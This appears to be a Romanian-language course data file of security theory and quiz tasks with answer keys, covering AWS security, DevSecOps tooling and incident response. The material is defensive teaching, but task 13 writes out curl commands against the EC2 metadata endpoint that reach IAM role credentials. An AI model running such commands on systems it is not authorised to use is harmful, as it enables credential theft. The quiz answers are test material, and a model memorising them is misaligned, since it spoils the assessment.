        question: "Ce este AWS CloudTrail si de ce e esential pentru incident response?",
        options: [
          "Un sistem de backup",
          "Logheaza toate apelurile API AWS (cine, ce, cand, de unde) — esential pentru a intelege ce s-a intamplat in incident",
          "Un tool de monitoring performance",
          "Un firewall cloud"
        ],
        answer: "Logheaza toate apelurile API AWS (cine, ce, cand, de unde) — esential pentru a intelege ce s-a intamplat in incident",
        explanation: "CloudTrail: DeleteBucket la 3AM de catre userul 'unknown-user' din IP China = semn clar de compromitere. Fara CloudTrail = blind in incident response.",
        difficulty: "medium"
      },
      {
        number: 7,
        name: "AWS Secrets Manager",
        question: "Scrie cod Python pentru a citi un secret din AWS Secrets Manager (conexiune baza de date).",
        type: "coding",
        language: "python",
        starterCode: "import boto3\nimport json\n\ndef get_db_credentials(secret_name):\n    # creeaza client secretsmanager\n    # citeste secretul\n    # parseaza JSON si returneaza credentials\n    pass\n\ncreds = get_db_credentials('prod/myapp/database')\nprint(f\"Host: {creds['host']}, User: {creds['username']}\")",
        options: [],
        answer: "",
        explanation: "client = boto3.client('secretsmanager'); response = client.get_secret_value(SecretId=secret_name); return json.loads(response['SecretString'])",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 8,
        name: "Security Group SSH",
        question: "De ce este periculos Security Group-ul cu SSH deschis la 0.0.0.0/0?",
        options: [
          "E mai lent",
          "Intreaga internet poate incerca brute force pe SSH — expunere la atacuri automatizate 24/7",
          "Consuma bandwith",
          "Nu suporta IPv6"
        ],
        answer: "Intreaga internet poate incerca brute force pe SSH — expunere la atacuri automatizate 24/7",
        explanation: "In primele minute dupa lansarea unui EC2 public, bot-urile incep brute force pe portul 22. Cu credentiale slabe sau SSH key compromise, accesul e rapid.",
        difficulty: "easy"
      },
      {
        number: 9,
        name: "VPC private subnets",
        question: "De ce plasezi bazele de date in subnets private (nu publice) in AWS VPC?",
        options: [
          "E mai ieftin",
          "Bazele de date nu au nevoie de acces internet direct — in subnet privata sunt inaccesibile din internet, reduc suprafata de atac",
          "E mai rapid",
          "E o conventie de naming"
        ],
        answer: "Bazele de date nu au nevoie de acces internet direct — in subnet privata sunt inaccesibile din internet, reduc suprafata de atac",
        explanation: "Arhitectura recomandata: ALB (public subnet) → EC2 App (private subnet) → RDS (private subnet). RDS fara ruta la internet = inaccesibil din exterior.",
        difficulty: "medium"
      },
      {
        number: 10,
        name: "IAM policy audit",
        question: "Scrie o comanda AWS CLI care verifica daca un user are permisiunea s3:DeleteBucket folosind policy simulation.",
        type: "coding",
        language: "bash",
        starterCode: "# User ARN: arn:aws:iam::123456789012:user/developer\n# Verifica: poate face s3:DeleteBucket?\n# Hint: aws iam simulate-principal-policy",
        options: [],
        answer: "",
        explanation: "aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:user/developer --action-names s3:DeleteBucket",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 11,
        name: "CSPM tools",
        question: "Ce este CSPM (Cloud Security Posture Management) si ce tool open-source e popular pentru AWS?",
        options: [
          "Un tip de firewall cloud",
          "Monitorizarea continua a configuratiei cloud pentru deviatii de la best practices — tool: Prowler, Scout Suite",
          "Un sistem de backup",
          "Un tool de pentest"
        ],
        answer: "Monitorizarea continua a configuratiei cloud pentru deviatii de la best practices — tool: Prowler, Scout Suite",
        explanation: "CSPM detecteaza: S3 public, Security Group cu port 22 public, IAM users fara MFA, root account utilizat. Prowler ruleaza >200 de verificari CIS Benchmark.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "gitleaks scan",
        question: "Scrie comanda gitleaks pentru a scana directorul curent pentru secrete si a genera un raport JSON.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza directorul curent (.) pentru secrete\n# Verbose output\n# Salveaza raport in secrets-report.json\n# Hint: gitleaks detect",
        options: [],
        answer: "",
        explanation: "gitleaks detect --source . --verbose -f json -r secrets-report.json",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "IMDSv2 access",
        question: "Cum accesezi credentialele IAM Role ale unui EC2 cu IMDSv2 (necesita token)?",
        options: [
          "Direct cu GET la 169.254.169.254",
          "Intai PUT pentru token, apoi GET cu token in header",
          "SSH pe instanta",
          "AWS CLI din exterior"
        ],
        answer: "Intai PUT pentru token, apoi GET cu token in header",
        explanation: "IMDSv2: TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') apoi curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/",
        difficulty: "hard"
      },
      {
        number: 14,
        name: "KMS encryption",
        question: "Ce este AWS KMS (Key Management Service) si de ce e preferat fata de gestionarea manuala a cheilor?",
        options: [
          "E mai ieftin",
          "KMS gestioneaza cheile in HSM-uri hardware dedicate — rotatie automata, audit trail complet, integrat cu toate serviciile AWS",
          "E mai rapid",
          "Singura optiune disponibila"
        ],
        answer: "KMS gestioneaza cheile in HSM-uri hardware dedicate — rotatie automata, audit trail complet, integrat cu toate serviciile AWS",
        explanation: "KMS: cheile nu parasesc niciodata KMS (nu le poti exporta). Rotatie anuala automata optionala. Fiecare utilizare e logata in CloudTrail.",
        difficulty: "medium"
      },
      {
        number: 15,
        name: "Root account security",
        question: "Ce masuri de securitate aplici IMEDIAT dupa crearea unui cont AWS nou?",
        options: [
          "Nimic — e sigur by default",
          "Activezi MFA pe root, creezi user IAM admin separat, nu mai folosesti root pentru operatii zilnice, setezi billing alerts",
          "Schimbi parola root la 30 zile",
          "Creezi S3 bucket"
        ],
        answer: "Activezi MFA pe root, creezi user IAM admin separat, nu mai folosesti root pentru operatii zilnice, setezi billing alerts",
        explanation: "Root account = putere absoluta in AWS — nu poate fi restrictionat de IAM policies. Compromiterea root = compromiterea totala. MFA + neutilizare zilnica = protectie.",
        difficulty: "medium"
      }
    ]
  },
  {
    slug: "devsecops",
    title: "27. DevSecOps",
    order: 27,
    theory: [
      {
        order: 1,
        title: "SAST si DAST — testare securitate in CI/CD",
        content: "**DevSecOps** = integrarea securitatii in fiecare faza a ciclului de dezvoltare (Shift Left Security).\n\n**SAST** (Static Application Security Testing) = analiza codului sursa fara executare:\n\n```yaml\n# GitHub Actions — SAST cu CodeQL:\nname: Security Analysis\non: [push, pull_request]\n\njobs:\n  codeql:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Initialize CodeQL\n        uses: github/codeql-action/init@v2\n        with:\n          languages: javascript, python\n\n      - name: Autobuild\n        uses: github/codeql-action/autobuild@v2\n\n      - name: Perform CodeQL Analysis\n        uses: github/codeql-action/analyze@v2\n        with:\n          category: \"/language:javascript\"\n\n  semgrep:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: returntocorp/semgrep-action@v1\n        with:\n          config: >-\n            p/owasp-top-ten\n            p/security-audit\n            p/nodejs\n```\n\n**DAST** (Dynamic Application Security Testing) = testare aplicatie rulanta:\n\n```yaml\n  zap-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - name: ZAP Baseline Scan\n        uses: zaproxy/action-baseline@v0.10.0\n        with:\n          target: 'https://staging.myapp.com'\n          # ZAP ruleaza spider + atacuri pasive\n          # Full scan: action-full-scan (mai agresiv)\n```\n\n**Interview tip:** SAST = cod static (false positives frecvente). DAST = runtime (mai putine false positives, necesita aplicatie rulanta). Ambele sunt complementare."
      },
      {
        order: 2,
        title: "Dependency Scanning si Container Security",
        content: "**Dependency scanning** detecteaza vulnerabilitati in librariile third-party.\n\n```yaml\n# Dependabot — GitHub (gratuit, automat):\n# .github/dependabot.yml:\nversion: 2\nupdates:\n  - package-ecosystem: npm\n    directory: /\n    schedule:\n      interval: weekly\n    security-updates-only: true  # PR automat pentru security fixes\n\n  - package-ecosystem: docker\n    directory: /\n    schedule:\n      interval: daily\n```\n\n```bash\n# Snyk — dependency + container scanning:\nsnyk test                        # npm vulnerabilities\nsnyk test --all-projects         # toate proiectele\nsnyk container test node:18      # Docker image\nsnyk iac test terraform/          # Infrastructure as Code\n\n# npm audit:\nnpm audit\nnpm audit fix --force  # auto-fix (atentie la breaking changes!)\n\n# OWASP Dependency-Check:\ndependency-check --project myapp --scan . --format HTML\n```\n\n**Container Security:**\n```dockerfile\n# ✅ Best practices Dockerfile:\n\n# 1. Imagine de baza minimala (nu root!):\nFROM node:18-alpine  # Alpine = minimal\n\n# 2. User non-root:\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\nUSER appuser  # nu rula ca root!\n\n# 3. Multi-stage build (elimina dev tools din productie):\nFROM node:18 AS builder\nWORKDIR /app\nCOPY package*.json .\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM node:18-alpine AS runner\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nUSER node\nEXPOSE 3000\nCMD [\"node\", \"dist/server.js\"]\n```\n\n```bash\n# Trivy — container vulnerability scanner:\ntrivy image myapp:latest\ntrivy image --severity HIGH,CRITICAL myapp:latest\ntrivy image --exit-code 1 --severity CRITICAL myapp:latest  # fail CI la CRITICAL\n```\n\n**Interview tip:** Niciodata USER root in Dockerfile de productie. Multi-stage build reduce suprafata de atac eliminand compilatoarele, npm etc."
      },
      {
        order: 3,
        title: "Secrets in CI/CD — prevenire si detectie",
        content: "**Secretele in cod** sunt un vector de atac extrem de frecvent si costisitor.\n\n```yaml\n# GitHub Actions — folosire corecta a secrets:\nname: Deploy\nenv:\n  DATABASE_URL: ${{ secrets.DATABASE_URL }}  # ✅ Secret GitHub\n  API_KEY: ${{ secrets.API_KEY }}\n  # ❌ Niciodata:\n  # API_KEY: \"sk-1234abcd\"  # hard-coded in workflow!\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Deploy cu secret\n        run: |\n          # $API_KEY e disponibil dar mascata in logs (***)\n          curl -H \"Authorization: Bearer $API_KEY\" https://api.service.com/deploy\n```\n\n```bash\n# Pre-commit hook cu gitleaks:\n# .pre-commit-config.yaml:\nrepos:\n  - repo: https://github.com/gitleaks/gitleaks\n    rev: v8.18.0\n    hooks:\n      - id: gitleaks\n        name: Detectare secrete\n        description: Blocheaza commit-urile cu secrete detectate\n\n# Instalare:\npre-commit install\n\n# Acum la fiecare git commit se ruleaza gitleaks!\n# Daca detecteaza un secret: commit BLOCAT\n\n# SOPS — criptare fisiere de configurare:\nsops --encrypt --age age1... secrets.yaml > secrets.enc.yaml\nsops --decrypt secrets.enc.yaml\n# Poti comite secrets.enc.yaml in Git!\n\n# Rotatie secrete compromise:\n# 1. Revoca imediat (GitHub token: github.com/settings/tokens)\n# 2. Verifica log-urile pentru utilizare neautorizata\n# 3. Genereaza nou\n# 4. Notifica echipa si actualizeaza\n```\n\n**Interview tip:** git secret purge sterge un fisier din toata istoria Git (git filter-branch). Dar presupune ca secretul a fost deja vazut de ceilalti — revoca mereu inainte de stergere din istoricul git."
      },
      {
        order: 4,
        title: "Infrastructure as Code Security si Supply Chain",
        content: "**IaC Security** = verifica securitatea infrastructurii inainte de deployment.\n\n```bash\n# Checkov — IaC security scanner:\ncheckov -d terraform/              # scan Terraform\ncheckov -f k8s-deployment.yaml     # scan Kubernetes\ncheckov -d . --framework cloudformation  # AWS CloudFormation\n\n# Exemple de ce detecteaza Checkov:\n# CKV_AWS_21: S3 bucket nu are versioning activat\n# CKV_AWS_3: S3 bucket nu are logging activat\n# CKV_AWS_130: ALB nu redirecteaza HTTP la HTTPS\n\n# tfsec — Terraform security:\ntfsec terraform/\ntfsec --format sarif terraform/ > tfsec-results.sarif\n\n# Integrare CI:\njobs:\n  iac-security:\n    steps:\n      - name: Checkov scan\n        uses: bridgecrewio/checkov-action@master\n        with:\n          directory: terraform/\n          framework: terraform\n          output_format: sarif\n          output_file_path: results.sarif\n```\n\n**Supply Chain Security:**\n```bash\n# SLSA (Supply chain Levels for Software Artifacts):\n# Level 1: Build process documentat\n# Level 2: Source version controlled, build service\n# Level 3: Build service trusted, build-as-code\n# Level 4: Two-party review, hermetic builds\n\n# Sigstore / cosign — semnare imagine Docker:\ncosign sign --key cosign.key myapp:latest\ncosign verify --key cosign.pub myapp:latest\n\n# SBOM (Software Bill of Materials) — inventar dependente:\nsyft myapp:latest -o spdx-json > sbom.json\ngrype sbom.json  # verifica vulnerabilitati in SBOM\n\n# Dependente pinned la hash (nu tag):\n# ❌ uses: actions/checkout@v3  (tag poate fi mutat!)\n# ✅ uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608\n```\n\n**Interview tip:** SolarWinds hack (2020) = supply chain attack clasic. SBOM e acum cerut de Executive Order SUA pentru software guvernamental. Cosign + Sigstore = standard modern pentru verificarea imaginilor Docker."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "SAST vs DAST",
        question: "Care e diferenta principala dintre SAST si DAST in testarea securitatii aplicatiilor?",
        options: [
          "Nu exista diferenta",
          "SAST analizeaza codul sursa static (fara executare); DAST testeaza aplicatia rulanta trimite payload-uri reale",
          "SAST e mai precis mereu",
          "DAST se face manual"
        ],
        answer: "SAST analizeaza codul sursa static (fara executare); DAST testeaza aplicatia rulanta trimite payload-uri reale",
        explanation: "SAST: detecteaza vulnerabilitati early (CI gate), dar false positives frecvente. DAST: fewer false positives, necesita mediu staging rulant.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "Dockerfile USER",
        question: "De ce e important sa specifici USER non-root in Dockerfile?",
        options: [
          "E obligatoriu de Docker",
          "Daca procesul e compromis (RCE), atacatorul are privilegii limitate — nu poate scrie fisiere sistem sau instala software",
          "E mai rapid",
          "Reduce dimensiunea imaginii"
        ],
        answer: "Daca procesul e compromis (RCE), atacatorul are privilegii limitate — nu poate scrie fisiere sistem sau instala software",
        explanation: "Container ca root = daca e RCE, atacatorul e root in container. Cu USER appuser: nu poate instala, nu poate modifica /etc, nu poate escalada privilegii in container.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "GitHub Actions secrets",
        question: "Scrie un GitHub Actions workflow care foloseste un secret API_KEY securizat (nu hard-codat) pentru a face un request HTTP.",
        type: "coding",
        language: "yaml",
        starterCode: "name: Deploy\non: push\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - name: Call API with secret\n        # Foloseste API_KEY din GitHub Secrets\n        # Nu expune valoarea in cod sau in afara steps",
        options: [],
        answer: "",
        explanation: "env: API_KEY: ${{ secrets.API_KEY }} run: curl -H \"Authorization: Bearer $API_KEY\" https://api.example.com/deploy",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 4,
        name: "Trivy container scan",
        question: "Scrie comanda Trivy care scaneaza imaginea myapp:latest si face fail la vulnerabilitati CRITICAL.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza: myapp:latest\n# Severitate: doar HIGH si CRITICAL\n# Exit code 1 daca gaseste vulnerabilitati CRITICAL (pentru CI fail)\n# Hint: trivy image --exit-code --severity",
        options: [],
        answer: "",
        explanation: "trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 5,
        name: "pre-commit hooks",
        question: "La ce servesc pre-commit hooks in contextul DevSecOps?",
        options: [
          "Formateaza codul automat",
          "Ruleaza verificari (linting, secret scanning, SAST) inainte de fiecare commit — blocheaza commit-urile problematice",
          "Genereaza documentatie",
          "Ruleaza teste de performanta"
        ],
        answer: "Ruleaza verificari (linting, secret scanning, SAST) inainte de fiecare commit — blocheaza commit-urile problematice",
        explanation: "pre-commit cu gitleaks: detecteaza si blocheaza commit-ul inainte ca secretul sa ajunga in istoricul Git. Mai devreme = mai ieftin de remediat.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Dependabot config",
        question: "Scrie configuratia Dependabot (.github/dependabot.yml) pentru a activa update-uri automate de securitate pentru npm, saptamanal.",
        type: "coding",
        language: "yaml",
        starterCode: "# .github/dependabot.yml\n# Configureaza Dependabot pentru:\n# - npm, directorul radacina\n# - saptamanal\n# - doar security updates",
        options: [],
        answer: "",
        explanation: "version: 2 updates: - package-ecosystem: npm directory: / schedule: interval: weekly security-updates-only: true",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "multi-stage build",
        question: "Ce avantaj de securitate ofera multi-stage Docker builds?",
        options: [
          "Imagini mai colorate",
          "Elimina toolchain-ul de build (compiliator, npm etc.) din imaginea finala — suprafata de atac redusa",
          "Build mai rapid",
          "Compatibilitate mai buna"
        ],
        answer: "Elimina toolchain-ul de build (compiliator, npm etc.) din imaginea finala — suprafata de atac redusa",
        explanation: "Imagine cu gcc, npm, make = sute de CVE-uri potentiale. Multi-stage: imagine finala contine doar binarele necesare. Exemplu: imaginea finala Go = doar executabilul static.",
        difficulty: "medium"
      },
      {
        number: 8,
        name: "Checkov Terraform",
        question: "Scrie comanda Checkov pentru a scana fisierele Terraform din directorul ./infra si a genera output in format SARIF.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza: directorul ./infra\n# Framework: terraform\n# Output: SARIF (pentru GitHub Security tab)\n# Salveaza in: results.sarif",
        options: [],
        answer: "",
        explanation: "checkov -d ./infra --framework terraform --output sarif --output-file results.sarif",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 9,
        name: "SBOM",
        question: "Ce este un SBOM (Software Bill of Materials) si de ce a devenit obligatoriu?",
        options: [
          "Un tip de test",
          "Un inventar complet al componentelor software si dependentelor — cerut de Executive Order US (2021) pentru software guvernamental dupa SolarWinds",
          "Un format de packaging",
          "Un standard de coding"
        ],
        answer: "Un inventar complet al componentelor software si dependentelor — cerut de Executive Order US (2021) pentru software guvernamental dupa SolarWinds",
        explanation: "SBOM permite: identificarea rapida a componentelor vulnerabile (ex: Log4Shell — cine are log4j?), compliance, supply chain transparency.",
        difficulty: "medium"
      },
      {
        number: 10,
        name: "Snyk scan",
        question: "Ce face comanda snyk container test node:18?",
        options: [
          "Testeaza aplicatia Node.js",
          "Scaneaza imaginea Docker node:18 pentru vulnerabilitati CVE in OS packages si librarii",
          "Instaleaza Node.js 18",
          "Testeaza performanta"
        ],
        answer: "Scaneaza imaginea Docker node:18 pentru vulnerabilitati CVE in OS packages si librarii",
        explanation: "Snyk container: analizeaza imaginea Docker layer cu layer, detecteaza CVE-uri in package manager (apt, apk), afiseaza fix (upgrade la node:18-alpine).",
        difficulty: "easy"
      },
      {
        number: 11,
        name: "Supply chain attack",
        question: "Ce este un supply chain attack si cum protejeaza pinning-ul la hash de actions CI/CD?",
        options: [
          "Un atac pe lanflt de aprovizionare fizic",
          "Compromiterea unei dependente/tool upstream pentru a infecta toti utilizatorii; pinning la hash garanteaza ca versiunea nu s-a schimbat",
          "Un atac DoS",
          "O vulnerabilitate in containerul Docker"
        ],
        answer: "Compromiterea unei dependente/tool upstream pentru a infecta toti utilizatorii; pinning la hash garanteaza ca versiunea nu s-a schimbat",
        explanation: "SolarWinds: update legitim infectat cu malware. actions/checkout@v3 poate fi mutat; actions/checkout@sha256=... nu poate fi modificat fara ca SHA256-ul sa se schimbe.",
        difficulty: "hard"
      },
      {
        number: 12,
        name: "CodeQL analysis",
        question: "Ce tip de vulnerabilitati detecteaza CodeQL prin analiza statica a codului?",
        options: [
          "Doar SQL injection",
          "XSS, SQL injection, command injection, path traversal, SSRF, insecure deserialization — analizeaza fluxul datelor (taint analysis)",
          "Doar erori de compilare",
          "Doar vulnerabilitati critice"
        ],
        answer: "XSS, SQL injection, command injection, path traversal, SSRF, insecure deserialization — analizeaza fluxul datelor (taint analysis)",
        explanation: "CodeQL taint analysis: urmareste datele de la surse nesigure (user input) la sink-uri periculoase (DB query, shell exec) prin tot codul — detecteaza vulnerabilitati complex de gasit manual.",
        difficulty: "medium"
      },
      {
        number: 13,
        name: "git secret purge",
        question: "Ce faci daca ai commit-uit din greseala o cheie API in istoricul Git si ai facut push?",
        options: [
          "Stergi fisierul si faci commit nou",
          "Revoci imediat cheia, presupui ca e compromisa, stergi din istoricul Git (git filter-branch/BFG), forci push — dar cheia trebuie tratata ca si compromisa",
          "Nu e o problema daca e in repo privat",
          "Faci git revert"
        ],
        answer: "Revoci imediat cheia, presupui ca e compromisa, stergi din istoricul Git (git filter-branch/BFG), forci push — dar cheia trebuie tratata ca si compromisa",
        explanation: "Cheia publicata in Git trebuie considerata compromisa imediat (boturile scaneaza GitHub continuu). Revoca intai, apoi curata istoricul. Nu doar 'git rm' — ramane in history.",
        difficulty: "hard"
      },
      {
        number: 14,
        name: "SLSA levels",
        question: "Ce garanteaza SLSA Level 3 pentru un artefact software?",
        options: [
          "Codul e scris bine",
          "Build service de incredere, build-as-code, source auditabila — garanteaza ca artefactul vine din sursa cunoscuta si procesul de build nu a fost manipulat",
          "Zero vulnerabilitati",
          "Performance optima"
        ],
        answer: "Build service de incredere, build-as-code, source auditabila — garanteaza ca artefactul vine din sursa cunoscuta si procesul de build nu a fost manipulat",
        explanation: "SLSA = Supply chain Levels for Software Artifacts. L3: build isolation, no persistent credentials, build process in code. Protejeaza impotriva SolarWinds-like attacks.",
        difficulty: "hard"
      },
      {
        number: 15,
        name: "Semgrep rule",
        question: "Ce face Semgrep si cum difera de un simplu grep in cautarea vulnerabilitatilor de securitate?",
        options: [
          "Semgrep e mai rapid",
          "Semgrep intelege structura codului (AST) si poate detecta pattern-uri semantice de securitate — nu poate fi bypassat prin formatare diferita",
          "Semgrep suporta mai multe limbaje",
          "Nu exista diferenta semnificativa"
        ],
        answer: "Semgrep intelege structura codului (AST) si poate detecta pattern-uri semantice de securitate — nu poate fi bypassat prin formatare diferita",
        explanation: "grep cauta text. Semgrep: exec($user_input) detecteaza apel exec cu orice variabila din user input, indiferent de spatii/newlines. Pattern p/owasp-top-ten detecteaza top 10.",
        difficulty: "hard"
      }
    ]
  },
  {
    slug: "incident-response",
    title: "28. Incident Response",
    order: 28,
    theory: [
      {
        order: 1,
        title: "IR Lifecycle — NIST SP 800-61 si fazele principale",
        content: "**Incident Response (IR)** = procesul structurat de gestionare a incidentelor de securitate.\n\n**NIST SP 800-61 — Ghidul standard:**\n\n```\n┌─────────────────────────────────────────┐\n│         IR Lifecycle (NIST)             │\n│                                         │\n│  1. PREPARATION                         │\n│     → Politici, playbooks, tools        │\n│     → Echipa IR (CSIRT), escaladare     │\n│     → Backup-uri, monitorizare          │\n│                  ↓                      │\n│  2. DETECTION & ANALYSIS               │\n│     → Alerte SIEM, IDS/IPS             │\n│     → Triage: real incident sau FP?     │\n│     → Scoping: ce sisteme afectate?     │\n│                  ↓                      │\n│  3. CONTAINMENT                         │\n│     → Short-term: izolezi sistemul      │\n│     → Long-term: patch, credentiale     │\n│                  ↓                      │\n│  4. ERADICATION                         │\n│     → Elimini cauza radacina (root)     │\n│     → Stergi malware, backdoor-uri      │\n│                  ↓                      │\n│  5. RECOVERY                            │\n│     → Restaurare servicii              │\n│     → Monitoring intensificat           │\n│                  ↓                      │\n│  6. POST-INCIDENT (Lessons Learned)     │\n│     → Ce s-a intamplat? Timeline        │\n│     → Ce a mers bine/rau?              │\n│     → Imbunatatiri procese             │\n└─────────────────────────────────────────┘\n```\n\n**Roluri in IR Team (CSIRT):**\n- **Incident Commander** — coordoneaza, comunica cu management\n- **Technical Lead** — conduce investigatia tehnica\n- **Forensics Analyst** — colecteaza si analizeaza dovezi\n- **Communication Lead** — comunicare interna/externa/PR\n- **Legal/Compliance** — obligatii legale (GDPR 72h notificare)\n\n**Interview tip:** GDPR Art. 33: notificarea autoritatii (ANSPDCP in Romania) in 72 ore de la detectarea unui breach ce afecteaza date personale. GDPR Art. 34: notificarea utilizatorilor afectati daca riscul e ridicat."
      },
      {
        order: 2,
        title: "Detection, Triage si Scoping — cum identifici si clasifici incidentul",
        content: "**Detection** — surse de alerta:\n\n```bash\n# SIEM (Security Information and Event Management):\n# Splunk, Elastic SIEM, Microsoft Sentinel\n\n# Alerte tipice:\n# - Brute force: >10 logon failures/minut de la acelasi IP\n# - Malware: proces care face conexiuni la IP-uri C2 cunoscute\n# - Data exfiltration: transfer mare de date la IP extern neobisnuit\n# - Privilege escalation: user normal executa comenzi admin\n\n# Triage rapid — intrebari cheie:\n# 1. Ce s-a intamplat? (tip incident)\n# 2. Cand a inceput? (time of compromise)\n# 3. Ce sisteme sunt afectate?\n# 4. Date sensibile expuse? (PII, financiare, IP)\n# 5. Incidentul e activ sau s-a terminat?\n\n# Clasificare severitate:\n# CRITICAL: ransomware activ, date PII exfiltrate, production down\n# HIGH: intruziune confirmata, cont admin compromis\n# MEDIUM: tentativa de intruziune blocata, malware izolat\n# LOW: scan de porturi, tentative brute force blocate\n\n# IOC hunting in logs:\ngrep \"Failed password\" /var/log/auth.log | \\\n    awk '{print $11}' | sort | uniq -c | sort -rn\n\n# Splunk query — detectie lateral movement:\nindex=windows EventCode=4624 Logon_Type=3\n| stats count by src_ip, dest_host\n| where count > 10\n\n# EDR (Endpoint Detection and Response) — CrowdStrike, SentinelOne:\n# Detecteaza comportament malitios in timp real pe endpoint\n# Izolare automata la detectie (network quarantine)\n```\n\n**Interview tip:** Mean Time to Detect (MTTD) si Mean Time to Respond (MTTR) sunt KPI-uri critice in IR. IBM Cost of Data Breach 2024: MTTD mediu = 194 zile. Cu AI: ~99 zile."
      },
      {
        order: 3,
        title: "Containment, Eradication si Recovery",
        content: "**Containment** — opresti raspandirea fara a distruge dovezi:\n\n```bash\n# Short-term containment:\n# Izolare retea (nu oprire server — pierzi volatilele!):\niptables -I INPUT -j DROP      # blocheaza tot traficul inbound\niptables -I OUTPUT -j DROP     # blocheaza tot traficul outbound\niptables -I INPUT -s 10.0.0.0/8 -j ACCEPT  # permiti doar reteaua interna\n\n# AWS — izolarea unui EC2 compromis:\naws ec2 modify-instance-attribute \\\n    --instance-id i-1234567890abcdef0 \\\n    --groups sg-quarantine  # Security Group care blocheaza tot\n\n# Dezactivare cont compromis (nu stergere — pastrezi dovezi):\naws iam put-user-policy --user-name compromised-user \\\n    --policy-name DenyAll \\\n    --policy-document '{\"Statement\":[{\"Effect\":\"Deny\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n\n# Resetare parola si revocare toate sesiunile:\naws cognito-idp admin-user-global-sign-out \\\n    --user-pool-id eu-west-1_xxx \\\n    --username victim-user\n\n# Long-term containment:\n# Patch vulnerabilitate exploatata\n# Rotatie toate credentialele din sistem\n# Deploy WAF rules pentru vectorul de atac\n\n# Eradication:\n# Identificare toate backdoor-urile:\nfind / -newer /tmp/incident_time -type f -executable 2>/dev/null\ncrontab -l  # jobs malitioase\nls /etc/cron.d/ /etc/cron.daily/\n\n# Recovery:\n# Deploy imagine curata din backup verificat\n# Monitoring intensificat (IDS signatures noi)\n# Verifica integritatea: aide --check (AIDE)\n```\n\n**Interview tip:** Decizia de a opri vs a contine sistemul afectat e cruciala. Oprire = pierzi volatilele (RAM, procese). Containment in retea = pastrezi dovezi si poti analiza live."
      },
      {
        order: 4,
        title: "Post-Incident Review si Lessons Learned",
        content: "**Post-Incident Review (PIR)** = cea mai valoroasa parte a IR — inveti si imbunatatesti.\n\n**Structura PIR meeting (Blameless Postmortem):**\n```\n1. TIMELINE RECONSTRUCTA\n   - 2025-01-15 14:23: Prima alerta SIEM (brute force SSH)\n   - 2025-01-15 14:45: Autentificare reusita de la IP Russia\n   - 2025-01-15 15:10: Detectat lateral movement catre DB server\n   - 2025-01-15 15:30: Date exfiltrate (2.3GB la IP extern)\n   - 2025-01-15 16:00: Detectie incident de catre echipa SOC\n   - 2025-01-15 16:15: Containment (izolare retea)\n   MTTD: 97 minute, MTTR: 35 minute\n\n2. ROOT CAUSE ANALYSIS (5 Whys):\n   - De ce a reusit brute force? Server expus direct pe internet\n   - De ce nu era MFA? Nu era policy tehnica obligatorie\n   - De ce parola a cedat? Policy parole slabe (minim 8 chars)\n   - De ce nu a fost detectat mai rapid? Nu aveam alertare pe brute force\n   - De ce nu aveam alertare? SIEM nu era configurat corect\n\n3. CE A MERS BINE:\n   - Izolarea rapida (35 min) a prevenit stergerea datelor\n   - Comunicarea echipei a fost buna\n   - Backup-urile erau integre\n\n4. CE A MERS RAU:\n   - MTTD de 97 min e prea mare\n   - Nu aveam playbook pentru exfiltrare de date\n   - Comunicarea cu managementul a fost intarziata\n\n5. ACTION ITEMS (cu owner si deadline):\n   - [ ] Activare MFA obligatoriu toate conturile (DevOps, 7 zile)\n   - [ ] Configurare alertare brute force SIEM (SOC, 3 zile)\n   - [ ] Creare playbook exfiltrare date (IR Lead, 14 zile)\n   - [ ] Review Security Groups EC2 (Cloud, 7 zile)\n```\n\n**Compliance si GDPR:**\n```\nGDPR Art. 33 — Notificare autoritate (72h):\n  - Natura breach-ului\n  - Categorii de date afectate\n  - Numar aproximativ persoane\n  - Masuri luate\n\nGDPR Art. 34 — Notificare persoane afectate:\n  - Daca risc ridicat pentru drepturi si libertati\n  - In limbaj clar, accesibil\n  - Ce masuri poti lua pentru a te proteja\n```\n\n**Interview tip:** Blameless postmortem (Google SRE cultura) = se cauta cauze sistemice, nu vinovati. Oamenii iau decizii bune cu informatiile disponibile la acel moment."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "IR phases order",
        question: "Care este ordinea corecta a fazelor Incident Response conform NIST SP 800-61?",
        options: [
          "Detection → Containment → Eradication → Recovery → Lessons Learned",
          "Preparation → Detection → Containment → Eradication → Recovery → Post-Incident",
          "Containment → Detection → Recovery → Reporting",
          "Response → Forensics → Remediation"
        ],
        answer: "Preparation → Detection → Containment → Eradication → Recovery → Post-Incident",
        explanation: "Preparation e cruciala — fara playbooks, tools si echipa pregatita, celelalte faze sunt haotice. Post-Incident = Lessons Learned asigura imbunatatire continua.",
